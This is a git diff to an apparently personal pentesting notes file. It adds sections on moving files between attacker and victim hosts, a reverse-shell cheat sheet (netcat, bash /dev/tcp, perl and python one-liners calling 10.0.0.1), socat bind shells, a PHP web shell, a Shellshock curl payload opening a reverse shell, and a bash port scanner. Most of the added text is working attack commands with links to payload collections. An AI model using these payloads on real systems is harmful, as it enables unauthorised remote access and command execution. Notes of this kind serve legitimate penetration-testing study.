@@ -2,10 +2,9 @@
 
 - [osint](./osint.md)
 - [firewall](./firewall.sh)
-- [mitmproxy](./mitmproxy.sh)
+- [mitmproxy](./mitmproxy.md)
 - [nmap](./nmap.sh)
 - [wireshark](./wireshark.md)
-- [reverse_shell](./reverse_shell.sh)
 
 - Port mirroring / Switched Port Analyzer (SPAN)
 - https://rootsh3ll.com/evil-twin-attack/
@@ -36,9 +35,181 @@
 - https://hc.apache.org/httpclient-3.x/performance.html
 - [The C10K problem - handling ten thousand clients simultaneously](http://www.kegel.com/c10k.html)
 
-# replay
+# transfer
 
-- https://tcpreplay.appneta.com/
+```bash
+# 1. source_host
+# - if /tmp in ro filesystem, then write to /dev
+bin=socat.gz
+(
+printf '%s\n' \
+  ': > /tmp/1';
+base64 "$bin" | xargs -i printf '%s\n' "printf '%s' '"{}"' >> /tmp/1";
+printf '%s\n' \
+  'base64 -d /tmp/1 | gzip -d > /tmp/2' \
+  'chmod +x /tmp/2' \
+  '/tmp/2'
+) | xclip -in
+
+# 2. target_host
+# [ Paste clipboard content... ]
+# - ETA: 20000 lines ~= 10 minutes
+# ||
+ssh hostname tar cvjf - ./foo/ | tar xjf -
+# ||
+echo 'gzip -ck9 ./foo | base64 -w0' | nc foo.com 5000 | base64 -d | gzip -d
+
+# Server sending file:
+# On server:
+socat -u FILE:test.dat TCP-LISTEN:9876,reuseaddr
+# On client:
+socat -u TCP:127.0.0.1:9876 OPEN:out.dat,creat
+
+# Server receiving file:
+# On server:
+socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt
+# On client:
+socat -u FILE:test.txt TCP:127.0.0.1:9876
+
+# Over http:
+# On attacker_host:
+python2 -m SimpleHTTPServer 8123
+# ||
+python3 -m http.server 8123
+# On victim_host:
+wget http://10.2.0.15:8123
+```
+
+- Listening with `/dev/tcp`
+    - https://unix.stackexchange.com/questions/49936/dev-tcp-listen-instead-of-nc-listen
+
+```bash
+# Send to victim_host:
+# On attacker_host:
+cat ./foo | nc -l -q 1 -p 8998
+# On victim_host:
+cat < /dev/tcp/$target_ip/8998 > ./foo
+
+# Send to attacker_host:
+# On attacker_host:
+nc -l -p 8998 -q 1 > ./foo < /dev/null
+# On victim_host:
+cat ./foo > /dev/tcp/$target_ip/8998 0<&1 2>&1
+```
+
+- Workaround remote commands without a login shell
+    - https://susam.in/blog/file-transfer-with-ssh-tee-and-base64/
+
+```bash
+# 1. source_host
+ssh user@host | tee ssh.txt
+sha1sum /tmp/payload
+base64 /tmp/payload
+exit
+# 2. target_host
+sed '1,/$ base64/d;/$ exit/,$d' ssh.txt | base64 -d > payload
+grep -A 1 sha1sum ssh.txt
+sha1sum payload
+```
+
+- Payload processing
+    - [netcat – encrypt transfer with openssl · GitHub](https://gist.github.com/leonklingele/d5bd28ee51a4b8e49baa)
+
+- https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
+- https://nullsweep.com/pivot-cheatsheet-for-pentesters/
+- https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/
+
+# reverse shell
+
+```bash
+# +
+msfvenom -l payloads | awk '/cmd\/unix/{print $1}'
+
+# netcat
+nc -lvp 4242
+nc -e /bin/sh 10.0.0.1 4242
+rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+
+# Bind shell
+# - https://book.hacktricks.xyz/tunneling-and-port-forwarding#socat
+# - https://unix.stackexchange.com/questions/22308/socat-reliable-file-transfer-over-tcp
+# 1. vulnerable_host
+socat EXEC:bash,pty,stderr,setsid,sigint,sane TCP-LISTEN:1337,reuseaddr,fork
+# 2. attacker_host
+socat FILE:"$(tty)",raw,echo=0 TCP:$vulnerable_host_ip:1337
+
+# Upgrading to pty
+# - https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+# 1. attacker_host
+socat file:"$(tty)",raw,echo=0 tcp-listen:8081,reuseaddr
+# 2. vulnerable_host
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$attacker_host_ip:8081
+
+# Upgrading to tty
+# Alternative: drop ssh key in target_host
+# References:
+# - https://steemit.com/hacking/@synapse/hacking-getting-a-functional-tty-from-a-reverse-shell
+# - https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell
+# 1. attacker_host
+stty raw -echo; nc -lp 8080; stty sane
+# 2. in reverse shell
+script /dev/null
+# ||
+reset
+export SHELL=bash
+export TERM=xterm
+stty rows $rows columns $columns
+
+# 1. attacker_host
+python -c 'import pty; pty.spawn("/bin/sh")'
+# [Ctrl-Z]
+stty_state=$(stty -g)
+stty raw -echo
+fg
+# ...
+stty raw echo
+# ||
+stty "$stty_state"
+
+# Validation
+tty
+# => /dev/pts/0
+# ||
+[[ $- == *i* ]] &&  echo "y" || echo "n"
+
+# - https://stackoverflow.com/questions/32910661/pretend-to-be-a-tty-in-bash-for-any-command
+# - https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal/41872292
+# - https://unix.stackexchange.com/questions/122616/why-do-i-need-a-tty-to-run-sudo-if-i-can-sudo-without-a-password
+(sleep 2; echo 'admin') | script -qc 'su -c whoami - root'
+0<&- script -qfc "ls --color=auto" /dev/null | cat
+
+# - https://www.gnucitizen.org/blog/reverse-shell-with-bash/
+# 1. attacker_host
+exec 5<>/dev/tcp/10.0.0.1/8080
+# 2. vulnerable_host
+cat <&5 | while read -r l; do $l 2>&5 >&5; done
+# ||
+while read -r l 0<&5; do $l 2>&5 >&5; done
+# ||
+cat <&5 & cat >&5; exec 5>&-
+
+# 1. vulnerable_host
+bash -i > /dev/tcp/10.0.0.1/8080 0<&1 2>&1
+# 2. attacker_host
+script /dev/null
+
+# Language specific
+# - [Reverse Shell Generator](https://www.revshells.com/)
+perl -e 'use Socket;$i="10.0.0.1";$p=8081;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+python -c 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1", 8081)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(["/bin/bash", "-i"]);'
+# <?php system($_GET['c']); ?>
+```
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+- https://guide.offsecnewbie.com/shells
+- https://highon.coffee/blog/reverse-shell-cheat-sheet/
+- https://alamot.github.io/reverse_shells/
+- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
 # relay
 
@@ -75,10 +246,30 @@ socat - UDP-DATAGRAM:239.255.1.1:4242,ip-add-membership=239.255.1.1:10.0.0.10,ip
 # remote file
 # > Note that streaming eg. via TCP or SSL does not guarantee to retain packet boundaries and may thus cause packet loss.
 socat -u FILE:"${HOME}/foo" TCP-LISTEN:8123,reuseaddr
-socat -u TCP:1.2.3.4:8123 STDOUT > /foo
+socat -u TCP:10.0.0.1:8123 STDOUT > /foo
+
+# cgi in bash
+curl --head vulnerable --header 'Connection: close' --header 'User-Agent: () { :; }; /bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"'
 ```
 
 - https://repo.or.cz/w/socat.git/blob/HEAD:/EXAMPLES
+- https://github.com/fijimunkii/bash-dev-tcp
+
+# Port scanner
+
+```bash
+target_ip=
+port=1
+while [ $port -lt 1024 ]; do
+  echo > /dev/tcp/$target_ip/$port
+  [ $? == 0 ] && echo $port "is open" >> /tmp/ports.txt
+  port=$((port + 1))
+done
+```
+
+# replay
+
+- https://tcpreplay.appneta.com/
 
 # access point
 
